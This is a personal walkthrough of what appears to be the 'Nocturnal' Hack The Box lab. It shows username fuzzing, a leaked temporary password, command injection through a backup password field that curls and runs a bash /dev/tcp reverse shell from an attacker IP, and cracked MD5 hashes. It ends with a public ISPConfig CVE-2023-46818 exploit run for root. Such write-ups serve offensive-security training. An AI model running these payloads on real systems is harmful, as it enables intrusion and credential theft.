@@ -1,0 +1,279 @@
+
+
+
+register and we are able to upload files
+
+Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed. 
+
+when uploading something, we see our files and can only directly download them
+http://nocturnal.htb/view.php?username=tony&file=test.pdf
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt -u "http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf" --hh 2985 -b "PHPSESSID=lpaka8ejclthh184qgk7gnerh7"
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf
+Total requests: 10177
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000086:   200        128 L    247 W      3037 Ch     "admin"                                             
+000000375:   200        128 L    248 W      3113 Ch     "amanda"  
+
+
+if we visit admin we see nothing
+amanda has a privacy.odt
+
+
+Dear Amanda,
+Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
+The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
+Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.
+
+Yours sincerely,
+Nocturnal's IT team
+
+
+login as amanda
+we see a new button for the admin panel
+there is a backup panel and source codes
+
+"We see a blacklist in place to filter the password characters one by one. The space character is also blocked.
+However, tabs and newlines aren't blocked.
+Therefore, URL encoded tab and newline characters can be used as follows:
+Tabs -> \t -> %09
+New line -> \n -> %0a
+Using these characters, a payload can be built to achieve command execution. The following payload has
+two parts.
+Part 1 - Downloading the shell payload to the target using curl .
+Part 2 - Executing the downloaded shell payload with bash ."
+
+
+after trying to avoid uploading anything there are lessons here.
+
+"The backup command is run via proc_open and backgrounded with &.
+The process is started by the web server (www-data), but it’s not attached to a real TTY or network socket.
+When you try a direct reverse shell, the process may be sandboxed, lack network access, or be killed quickly.
+The output you see on the webpage (attempted revshell execution) is from the command’s stdout/stderr, captured and displayed in the web page, not sent to your listener.
+Why the writeup’s method works:
+
+You first upload a shell script (using curl in the password field) so the file is present on disk.
+Then you send a second request to execute that file, which is more reliable because it’s a simple local execution, not a complex network operation in a restricted context.
+Direct reverse shell attempts often fail because:
+
+The web server’s process context may block outbound connections.
+The shell may not persist long enough to connect.
+The command’s output is redirected to a log file, not to your listener.
+Summary:
+
+The two-step method (upload, then execute) works because it separates file transfer and execution, making it more reliable in restricted environments.
+Direct reverse shell commands often fail due to web server restrictions, process context, or output handling."
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo "bash -c 'bash -i >& /dev/tcp/10.10.14.49/53 0>&1'" > revshell
+
+upload revshell                                                                         
+
+POST /admin.php?view=admin.php HTTP/1.1
+Host: nocturnal.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Origin: http://nocturnal.htb
+Connection: keep-alive
+Referer: http://nocturnal.htb/admin.php?view=admin.php
+Cookie: PHPSESSID=lpaka8ejclthh184qgk7gnerh7
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+password=kavi%0acurl%09http://10.10.14.49/revshell%09-o%09/tmp/revshell&backup=
+
+execute
+
+POST /admin.php?view=admin.php HTTP/1.1
+Host: nocturnal.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 79
+Origin: http://nocturnal.htb
+Connection: keep-alive
+Referer: http://nocturnal.htb/admin.php?view=admin.php
+Cookie: PHPSESSID=lpaka8ejclthh184qgk7gnerh7
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+password=kavi%0abash%09/tmp/revshell&backup=
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 53                         
+listening on [any] 53 ...
+connect to [10.10.14.49] from (UNKNOWN) [10.10.11.64] 56450
+bash: cannot set terminal process group (841): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@nocturnal:~/nocturnal.htb$
+
+
+
+
+www-data@nocturnal:~/nocturnal.htb$ ls -lsa
+total 56
+4 drwxr-xr-x 4 www-data  www-data  4096 Apr 17  2025 .
+4 drwxr-xr-x 6 ispconfig ispconfig 4096 Apr 14  2025 ..
+8 -rw-r--r-- 1 www-data  www-data  7357 Mar  4  2025 admin.php
+4 drwxr-xr-x 2 www-data  www-data  4096 Nov 13 06:04 backups
+4 -rw-r--r-- 1 www-data  www-data  2666 Apr 14  2025 dashboard.php
+4 -rw-r--r-- 1 www-data  www-data  1639 Apr  9  2025 index.php
+4 -rw-r--r-- 1 www-data  www-data  1425 Apr 14  2025 login.php
+4 -rw-r--r-- 1 www-data  www-data    84 Oct  5  2024 logout.php
+4 -rw-r--r-- 1 www-data  www-data  1404 Apr 14  2025 register.php
+4 -rw-r--r-- 1 www-data  www-data  3105 Oct 19  2024 style.css
+4 drwxr-xr-x 2 www-data  www-data  4096 Nov 13 06:00 uploads
+8 -rw-r--r-- 1 www-data  www-data  5415 Apr 16  2025 view.php
+www-data@nocturnal:~/nocturnal.htb$ cd ..
+www-data@nocturnal:~$ ls -lsa
+total 24
+4 drwxr-xr-x  6 ispconfig ispconfig 4096 Apr 14  2025 .
+4 drwxr-xr-x 14 root      root      4096 Oct 18  2024 ..
+4 drwxr-xr-x  2 root      root      4096 Mar  4  2025 html
+0 lrwxrwxrwx  1 root      root        34 Oct 17  2024 ispconfig -> /usr/local/ispconfig/interface/web
+4 drwxr-xr-x  4 www-data  www-data  4096 Apr 17  2025 nocturnal.htb
+4 drwxr-xr-x  2 www-data  www-data  4096 Nov 13 05:36 nocturnal_database
+4 drwxr-xr-x  4 ispconfig ispconfig 4096 Oct 17  2024 php-fcgi-scripts
+
+
+www-data@nocturnal:~$ cd nocturnal_database/
+www-data@nocturnal:~/nocturnal_database$ ls -lsa
+total 28
+ 4 drwxr-xr-x 2 www-data  www-data   4096 Nov 13 05:36 .
+ 4 drwxr-xr-x 6 ispconfig ispconfig  4096 Apr 14  2025 ..
+20 -rw-rw-r-- 1 www-data  www-data  20480 Nov 13 05:36 nocturnal_database.db
+www-data@nocturnal:~/nocturnal_database$ sqlite3 nocturnal_database.db 
+SQLite version 3.31.1 2020-01-27 19:55:54
+Enter ".help" for usage hints.
+sqlite> .tables
+
+sqlite> select * from users;
+1|admin|d725aeba143f575736b07e045d8ceebb
+2|amanda|df8b20aa0c935023f99ea58358fb63c4
+4|tobias|55c82b1ccd55ab219b3b109b07d5061d
+6|kavi|f38cde1654b39fea2bd4f72f1ae4cdda
+7|e0Al5|101ad4543a96a7fd84908fd0d802e7db
+8|tony|2fc0632497b8f1ac53d97618beaa6cad
+sqlite> 
+
+
+out of these. tobias is the target
+
+www-data@nocturnal:~/nocturnal_database$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+...
+tobias:x:1000:1000:tobias:/home/tobias:/bin/bash
+...
+
+www-data@nocturnal:/home$ ls
+tobias
+www-data@nocturnal:/home$ 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+slowmotionapocalypse (?)     
+1g 0:00:00:00 DONE (2025-11-13 01:24) 4.166g/s 15390Kp/s 15390Kc/s 15390KC/s slp312..slow86
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh tobias@nocturnal.htb
+The authenticity of host 'nocturnal.htb (10.10.11.64)' can't be established.
+ED25519 key fingerprint is SHA256:rpVMGW27qcXKI/SxVXhvpF6Qi8BorsH7RNh1jzi8VYc.
+This key is not known by any other names.
+...
+
+Last login: Thu Nov 13 06:25:19 2025 from 10.10.14.49
+tobias@nocturnal:~$ 
+
+
+
+tobias@nocturnal:~$ ss -tlnp
+State        Recv-Q       Send-Q             Local Address:Port                Peer Address:Port       Process       
+LISTEN       0            70                     127.0.0.1:33060                    0.0.0.0:*                        
+LISTEN       0            151                    127.0.0.1:3306                     0.0.0.0:*                        
+LISTEN       0            10                     127.0.0.1:587                      0.0.0.0:*                        
+LISTEN       0            4096                   127.0.0.1:8080                     0.0.0.0:*                        
+LISTEN       0            511                      0.0.0.0:80                       0.0.0.0:*                        
+LISTEN       0            4096               127.0.0.53%lo:53                       0.0.0.0:*                        
+LISTEN       0            128                      0.0.0.0:22                       0.0.0.0:*                        
+LISTEN       0            10                     127.0.0.1:25                       0.0.0.0:*                        
+LISTEN       0            128                         [::]:22                          [::]:*  
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -L 8089:127.0.0.1:8080 -N -vv tobias@nocturnal.htb
+
+navigating to
+localhost:8089
+
+ISPConfig
+
+we login with
+admin:slowmotionapocalypse
+
+
+ISPConfig Version: 3.2.10p1
+
+
+"Using this version number, let's look for any released CVEs. A Google search for ISPConfig exploit CVE
+3.2.10p1 reveals CVE-2023-46818, which allows remote code execution using ISPConfig "
+
+https://github.com/bipbopbup/CVE-2023-46818-python-exploit
+
+"User input passed through the "records" POST parameter to /admin/language_edit.php is 
+not properly sanitized before being used to dynamically generate PHP code that will be 
+executed by the application. This can be exploited by malicious administrator users to 
+inject and execute arbitrary PHP code on the web server."
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python exploit.py http://localhost:8089/ admin slowmotionapocalypse
+[+] Target URL: http://localhost:8089/
+[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
+[+] Injecting shell
+[+] Launching shell
+
+ispconfig-shell# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+
+
+
+
+
